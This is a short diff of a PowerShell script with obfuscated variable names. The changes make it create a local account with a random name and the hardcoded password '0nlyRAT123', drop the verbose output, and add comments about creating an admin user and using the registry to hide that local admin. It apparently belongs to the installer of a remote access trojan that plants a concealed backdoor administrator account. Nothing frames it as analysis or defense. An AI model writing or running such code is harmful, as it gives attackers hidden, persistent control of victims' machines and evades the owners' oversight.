@@ -20,12 +20,16 @@ function create_account {
     end {
     }
 }
-$xf061name = "WindowsGuest"
+# create admin user
+$xf061name = random_text
 $xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
-create_account -xf061name $xf061name -xf061pass $xf061pass -Verbose
+create_account -xf061name $xf061name -xf061pass $xf061pass
+
+# registry to hide local admin
 
 
-#create directory with random name in the temp directory
+
+# Variables
 $directory = random_text
 $temp_dir = "$env:TEMP\$directory"
 # save current directory
